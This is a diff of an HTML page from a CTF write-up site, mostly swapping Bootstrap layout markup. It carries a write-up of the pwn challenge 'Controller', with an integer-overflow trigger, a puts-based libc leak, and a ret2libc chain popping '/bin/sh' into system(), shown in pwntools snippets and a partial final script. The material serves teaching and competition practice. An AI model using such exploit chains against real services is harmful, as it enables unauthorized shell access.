@@ -9,49 +9,62 @@
         <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/pwning/htb_cyber_21/controller/controller/">
         <link rel="shortcut icon" href="../../../../img/favicon.ico">
         <title>Controller - CTF-Writeups</title>
-        <link href="../../../../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../../../../css/bootstrap-custom.min.css" rel="stylesheet">
         <link href="../../../../css/font-awesome.min.css" rel="stylesheet">
         <link href="../../../../css/base.css" rel="stylesheet">
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/darcula.min.css">
+        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
 
         <script src="../../../../js/jquery-1.10.2.min.js" defer></script>
-        <script src="../../../../js/bootstrap.min.js" defer></script>
+        <script src="../../../../js/bootstrap-3.0.3.min.js" defer></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
         <script>hljs.initHighlightingOnLoad();</script> 
     </head>
 
     <body>
-        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-dark">
+
+        <div class="navbar navbar-default navbar-fixed-top" role="navigation">
             <div class="container">
-                <a class="navbar-brand" href="../../../..">CTF-Writeups</a>
-                <!-- Expander button -->
-                <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar-collapse">
-                    <span class="navbar-toggler-icon"></span>
-                </button>
+
+                <!-- Collapsed navigation -->
+                <div class="navbar-header">
+                    <!-- Expander button -->
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                    <a class="navbar-brand" href="../../../..">CTF-Writeups</a>
+                </div>
 
                 <!-- Expanded navigation -->
-                <div id="navbar-collapse" class="navbar-collapse collapse">
+                <div class="navbar-collapse collapse">
                         <!-- Main navigation -->
                         <ul class="nav navbar-nav">
-                            <li class="navitem">
-                                <a href="../../../../about/" class="nav-link">About Us</a>
+                            <li >
+                                <a href="../../../../about/">About Us</a>
                             </li>
-                            <li class="navitem">
-                                <a href="../../../../shaktictf/" class="nav-link">ShaktiCTF</a>
+                            <li >
+                                <a href="../../../../shaktictf/">ShaktiCTF</a>
                             </li>
-                            <li class="navitem">
-                                <a href="https://team-shakti.github.io/" class="nav-link">Website</a>
+                            <li >
+                                <a href="https://team-shakti.github.io/">Website</a>
                             </li>
                         </ul>
 
-                    <ul class="nav navbar-nav ml-auto">
-                        <li class="nav-item">
-                            <a href="#" class="nav-link" data-toggle="modal" data-target="#mkdocs_search_modal">
+                    <ul class="nav navbar-nav navbar-right">
+                        <li>
+                            <a href="#" data-toggle="modal" data-target="#mkdocs_search_modal">
                                 <i class="fa fa-search"></i> Search
                             </a>
                         </li>
-                            <li class="nav-item">
-                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/pwning/htb_cyber_21/controller/controller.md" class="nav-link">Edit on Team-Shakti/CTF-Write-ups</a>
+                            <li>
+                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/pwning/htb_cyber_21/controller/controller.md">Edit on Team-Shakti/CTF-Write-ups</a>
                             </li>
                     </ul>
                 </div>
@@ -59,26 +72,19 @@
         </div>
 
         <div class="container">
-            <div class="row">
-                    <div class="col-md-3"><div class="navbar-light navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
-    <div class="navbar-header">
-        <button type="button" class="navbar-toggler collapsed" data-toggle="collapse" data-target="#toc-collapse" title="Table of Contents">
-            <span class="fa fa-angle-down"></span>
-        </button>
-    </div>
-
-    
-    <div id="toc-collapse" class="navbar-collapse collapse card bg-secondary">
-        <ul class="nav flex-column">
-            
-            <li class="nav-item" data-level="1"><a href="#controller" class="nav-link">Controller</a>
-              <ul class="nav flex-column">
-              </ul>
-            </li>
-        </ul>
-    </div>
+                <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
+    <ul class="nav bs-sidenav">
+        <li class="main active"><a href="#controller">Controller</a></li>
+            <li><a href="#description">Description :</a></li>
+            <li><a href="#solution">Solution</a></li>
+            <li><a href="#overflow">OVERFLOW</a></li>
+            <li><a href="#leak">LEAK</a></li>
+            <li><a href="#ret2libc">RET2LIBC</a></li>
+            <li><a href="#final-script">Final Script</a></li>
+            <li><a href="#flag">FLAG</a></li>
+    </ul>
 </div></div>
-                    <div class="col-md-9" role="main">
+                <div class="col-md-9" role="main">
 
 <h1 id="controller">Controller</h1>
 <h4 id="description">Description :</h4>
@@ -90,6 +96,7 @@
 </ul>
 <pre><code>controller: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e5746004163bf77994992a4c4e3c04565a7ad5d6, not stripped
 </code></pre>
+
 <ul>
 <li>On doing checksec:</li>
 </ul>
@@ -100,6 +107,7 @@
     NX:       NX enabled
     PIE:      No PIE (0x400000)
 </code></pre>
+
 <ul>
 <li>On running it:
 <img alt="run" src="../../controller/run.png" /></li>
@@ -120,6 +128,7 @@
   return 0;
 }
 </code></pre>
+
 <ul>
 <li>
 <p>welcome functions seems normal, so let's move on to other's</p>
@@ -153,6 +162,7 @@
   return;
 }
 </code></pre>
+
 <ul>
 <li>calc</li>
 </ul>
@@ -209,6 +219,7 @@ LAB_00401061:
   return (ulong)local_c;
 }
 </code></pre>
+
 <h4 id="overflow">OVERFLOW</h4>
 <ul>
 <li>From calculator(), we understood that our inputs(say, a and b) must be in such a way that on doing any of the above operations on it, should give us 0xff3a (65338). Once we can do that, we will get to "  __isoc99_scanf(&amp;DAT_004013e6,local_28);", which is gets as "%s" is unbound. Then we can overflow char local_28 [28]</li>
@@ -218,6 +229,7 @@ LAB_00401061:
 <pre><code>p.sendlineafter(': ','-65338 -130676')
 p.sendlineafter('&gt; ','2')
 </code></pre>
+
 <ul>
 <li>Now we got to scanf, to overflow we need to give a junk input of size 40 (32 + 8 padding).</li>
 </ul>
@@ -244,6 +256,7 @@ log.info('puts: ' + hex(address))
 libc.address = puts - libc.sym.puts
 log.info('libc.address: ' + hex(libc.ddress))
 </code></pre>
+
 <h4 id="ret2libc">RET2LIBC</h4>
 <ul>
 <li>Now that we have our addresses, we have to do a basic ret2libc. We have to overflow again and pop the address of "/bin/sh" in RDI .</li>
@@ -254,6 +267,7 @@ payload += p64(pop_rdi)
 payload += p64(libc.search(b&quot;/bin/sh&quot;).__next__())
 payload += p64(libc.sym.system)
 </code></pre>
+
 <p><img alt="terminal" src="../../controller/terminal.png" /></p>
 <h3 id="final-script">Final Script</h3>
 <pre><code>from pwn import *
@@ -297,9 +311,9 @@ p.sendlineafter('&gt; ',payload)
 p.recvuntil('ingored\n')
 p.interactive()
 </code></pre>
+
 <h3 id="flag">FLAG</h3>
 <p>CHTB{1nt3g3r_0v3rfl0w_s4v3d_0ur_r3s0urc3s}</p></div>
-            </div>
         </div>
 
         <footer class="col-md-12">
@@ -309,27 +323,27 @@ p.interactive()
         </footer>
         <script>
             var base_url = "../../../..",
-                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+                shortcuts = {"search": 83, "next": 78, "help": 191, "previous": 80};
         </script>
         <script src="../../../../js/base.js" defer></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
         <script src="../../../../search/main.js" defer></script>
 
-        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
-    <div class="modal-dialog modal-lg">
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="Search Modal" aria-hidden="true">
+    <div class="modal-dialog">
         <div class="modal-content">
             <div class="modal-header">
-                <h4 class="modal-title" id="searchModalLabel">Search</h4>
                 <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+                <h4 class="modal-title" id="exampleModalLabel">Search</h4>
             </div>
             <div class="modal-body">
                 <p>
                     From here you can search these documents. Enter
                     your search terms below.
                 </p>
-                <form>
+                <form role="form">
                     <div class="form-group">
-                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                        <input type="text" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
                     </div>
                 </form>
                 <div id="mkdocs-search-results"></div>
@@ -338,12 +352,12 @@ p.interactive()
             </div>
         </div>
     </div>
-</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="Keyboard Shortcuts Modal" aria-hidden="true">
     <div class="modal-dialog">
         <div class="modal-content">
             <div class="modal-header">
-                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
                 <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+                <h4 class="modal-title" id="exampleModalLabel">Keyboard Shortcuts</h4>
             </div>
             <div class="modal-body">
               <table class="table">
